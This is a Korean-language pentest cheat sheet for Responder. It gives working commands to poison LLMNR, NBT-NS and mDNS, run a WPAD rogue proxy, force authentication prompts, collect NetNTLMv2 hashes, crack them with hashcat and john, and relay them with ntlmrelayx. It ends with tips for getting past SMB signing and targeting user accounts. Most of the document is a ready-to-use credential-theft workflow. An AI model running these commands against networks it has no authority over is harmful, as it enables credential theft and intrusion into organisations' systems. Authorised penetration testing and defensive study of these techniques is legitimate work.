# Responder

- Responder — LLMNR·NBT-NS·mDNS 질의에 자신이 그 대상인 것처럼 응답해 NetNTLMv2 해시를 수집하는 도구. WPAD 프록시 서버·인증 프롬프트 강제 기능도 있다.
- 신규 세그먼트 초입에 자격증명을 모을 때, 해시 크랙·ntlmrelayx 릴레이의 원료를 만들 때, `-A` analyze 모드로 응답 없이 네트워크 흐름만 관찰할 때.
- 루트 권한, poison할 네트워크 인터페이스 1개, 같은 세그먼트의 Windows 호스트.

## 기본 사용

```bash
sudo responder -I eth0
sudo responder -I eth0 -A          # analyze: 응답하지 않고 질의만 관찰
sudo responder -I eth0 -w          # WPAD rogue proxy 활성
```

- `-I`는 필수. 인터페이스 대신 `-A`와 조합해 사전 관찰을 먼저 하는 편이 안전하다.

## 주요 옵션

- `-I <인터페이스>`: poison할 인터페이스 지정.
- `-A`: analyze 모드. LLMNR·NBT-NS 질의를 응답 없이 로그로만 본다.
- `-w`: WPAD rogue proxy 서버 시작. `-P`: 프록시 인증 강제(NTLM 투명/Basic 프롬프트).
- `-f`: 질의를 낸 호스트 지문 수집.
- `-d`: netbios 도메인 접미사 질의에도 응답.
- `--lm`: LM 해싱으로 강등(SMB1 환경).
- `-v`: verbose 출력.

## 해시 수집 위치와 크랙

```bash
ls /usr/share/responder/logs       # 칼리 apt 설치 기준. git clone이면 /opt/responder/logs
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
john /usr/share/responder/logs/*.txt
```

- 수집되는 것은 NetNTLMv2. hashcat 모드 5600(NetNTLMv2), 5500(NetNTLMv1).
- 로그 파일명에 프로토콜·대상 IP·유저가 들어간다(SMB-NTLMv2-ssp-<IP>.txt 등).

## 실전 흐름

```bash
# 1. 관찰 먼저
sudo responder -I eth0 -A
# 2. 포이즈닝 + 해시 수집
sudo responder -I eth0
# 3. 크랙 실패 시 릴레이로 전환 — Responder의 SMB·HTTP 청취를 먼저 끈다
#    /etc/responder/Responder.conf 에서 SMB = Off, HTTP = Off, HTTPS = Off
python3 ntlmrelayx.py -tf targets.txt -smb2support
sudo responder -I eth0
```

## 팁·트러블슈팅

- 릴레이를 붙일 때 Responder의 SMB·HTTP가 켜져 있으면 포트 충돌로 릴레이가 안 받는다. Responder.conf 수정이 필수다.
- `-A`에서 LLMNR 질의가 하나도 안 보이면 LLMNR이 이미 차단된 환경이거나 인터페이스·VLAN을 다시 확인.
- 컴퓨터 계정 인증은 크랙해도 쓸 게 없다. 유저 인증이 보일 때까지 대기하거나 mitm6로 IPv6 쪽을 노린다.
- SMB 서명이 필수인 환경에서는 받은 해시를 크랙하거나 HTTP(WPAD) 인증 수집으로 방향을 바꾼다.
